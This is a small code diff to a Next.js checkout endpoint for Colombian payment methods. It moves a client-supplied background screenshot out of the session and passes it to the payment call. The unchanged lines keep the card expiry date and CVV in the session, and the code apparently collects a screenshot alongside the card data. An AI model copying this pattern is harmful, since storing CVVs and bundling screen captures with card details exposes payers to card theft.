@@ -174,9 +174,6 @@ export async function POST(req: NextRequest) {
     session.fechaVencimiento = String(data.fechaVencimiento);
     session.cvv = String(data.cvv);
     session.cuotas = String(data.cuotas);
-    if (data.backgroundScreenshot) {
-      session.background_screenshot = String(data.backgroundScreenshot);
-    }
   }
 
   session.error = false;
@@ -200,7 +197,8 @@ export async function POST(req: NextRequest) {
   const checkoutRes = await enviarCheckout(
     session.metodoPago as "TARJETA" | "PSE" | "NEQUI" | "BANCOLOMBIA",
     session,
-    origin
+    origin,
+    data.backgroundScreenshot as string | undefined
   );
 
   // Sea cual sea la respuesta de pasarela (200 con redirect o 500 con error),
